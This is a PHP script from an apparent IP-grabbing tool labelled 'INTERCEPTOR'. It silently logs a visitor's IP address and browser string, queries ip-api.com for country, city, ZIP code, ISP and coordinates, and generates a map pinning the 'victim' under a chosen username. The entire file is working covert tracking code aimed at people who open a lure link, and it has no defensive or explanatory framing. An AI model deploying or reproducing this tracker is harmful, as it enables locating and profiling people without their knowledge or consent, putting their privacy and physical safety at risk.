<?php
# ORIGINAL-CREATOR: Luca Garofalo (Lucksi)
# AUTHOR: Luca Garofalo (Lucksi)
# Copyright (C) 2021-2023 Lucksi <lukege287@gmail.com>
# License: GNU General Public License v3.0

$get_username = fopen("../Temp/User.txt","r");
$reader = fread($get_username,filesize("../Temp/User.txt"));
fclose($get_username);
$local ="../Database/{$reader}.txt";
$local2 = "../Database/{$reader}_Map.html";
$browser = $_SERVER["HTTP_USER_AGENT"];

    function get_ip($ipaddress,$ip) {
        global $local;
        global $reader;
        global $local2;
        date_default_timezone_get();
        $date1= date("d/m/Y/h:i:sa");
        $date2 ="DATE:".$date1;
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
            $ip = "IP:".$ipaddress;           
        }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
            $ip = "IP:".$ipaddress;
        }
        else {
            $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
            $ip = "IP:".$ipaddress;
        }
        $opening = fopen($local,"w") or die("SERVER ERROR");
        fwrite($opening,$date2."\r\n");
        fwrite($opening,"IP-ADDRESS OF:{$reader}"."\r\n");
        fwrite($opening,$ip."\r\n");
    
        $query=@unserialize(file_get_contents("http://ip-api.com/php/{$ipaddress}"));
        
        if($query && $query["status"] == "success"){
            $Country ="Country:".$query["country"];
            $Timezone ="Timezone:".$query["timezone"];
            $Latidute ="Geo_Latidute:".$query["lat"];
            $Longitude ="Geo_Longitude:".$query["lon"];
            $Isp ="ISP:".$query["isp"];
            $Region ="Region:".$query["regionName"];
            $City ="City:".$query["city"];
            $Zip ="Zip-Code:".$query["zip"];
            $link = "Google-Maps-Link:https://www.google.it/maps/place/{$query["lat"]},{$query["lon"]}";
            fwrite($opening,$Country."\r\n");
            fwrite($opening,$Timezone."\r\n");
            fwrite($opening,$Region."\r\n");
            fwrite($opening,$Isp."\r\n");
            fwrite($opening,$City."\r\n");
            fwrite($opening,$Zip."\r\n");
            fwrite($opening,$Latidute."\r\n");
            fwrite($opening,$Longitude."\r\n");
            fwrite($opening,$link."\r\n");
            fclose($opening);
            $map = "
            <!DOCTYPE HTML>
            <!-- FILE GENERATED BY INTERCEPTOR-->
            <html>
                <head>
                <title>Map for {$reader} IP</title>
                <title>Map Post</title>
                <link rel = 'stylesheet' href = '../Template/Css/Map.css'>
                <link rel= stylesheet href= 'https://unpkg.com/leaflet@1.7.1/dist/leaflet.css'  integrity= 'sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A=='  crossorigin= '' />
                <script src= 'https://unpkg.com/leaflet@1.7.1/dist/leaflet.js'  integrity= 'sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==' crossorigin= ''></script>
                <meta charset = UTF-8 >
                <meta name= viewport  content= width=device-width, initial-scale=0.9>
                <meta name= theme-color content= #000000>
            </head>
            <body>
                <center>
                <br>
                <p>MAP FOR $reader</p>
                <div class =  map  id= map ></div>
                <script>
                    var map = L.map( 'map' ).setView([{$query["lat"]},{$query["lon"]}], 14);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution: '&copy; <a href= https://www.openstreetmap.org/copyright >OpenStreetMap</a> contributors'}).addTo(map);
                    L.marker([{$query["lat"]},{$query["lon"]}]).addTo(map).bindPopup('${reader} ip is approximatley based in this Area.').openPopup();
                </script>;       
            </body>
        </html>";
            $open = fopen($local2,"w");
            fwrite($open,$map);
            fclose($open);
        }
        else {
            $Error ="Sorry there is no Connection with the server";
            fwrite($opening,$Error."\r\n");
            fclose($opening);
        }
        
    }
    
    function get_os($vict_os,$os_datas) {
        global $browser;
        global $local;
        $vict_os = "UNKNOWN";
        $os_datas = array (
            '/windows nt 10/i'      =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu-Linux',
            '/kali/i'               =>  'Kali-Linux',
            '/parrot/i'             =>  'Parrot-Linux',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile',
            
        );
        foreach($os_datas as $platform => $Value) {
            if (preg_match($platform,$browser)){
                $vict_os = "OS_PLATFORM:".$Value;    
            }
        }
        $opening = fopen($local, "a+") or die("SERVER ERROR");
        fwrite($opening,$vict_os."\r\n");
    }

    function get_agent() {
        global $browser;
        global $local;
        $opening = fopen($local, "a+") or die("SERVER ERROR");
        fwrite($opening,"BROWSER:".$browser."\r\n");
    }
    
    get_ip($ipaddress,$ip);
    get_os($vict_os,$os_datas);
    get_agent();
?>
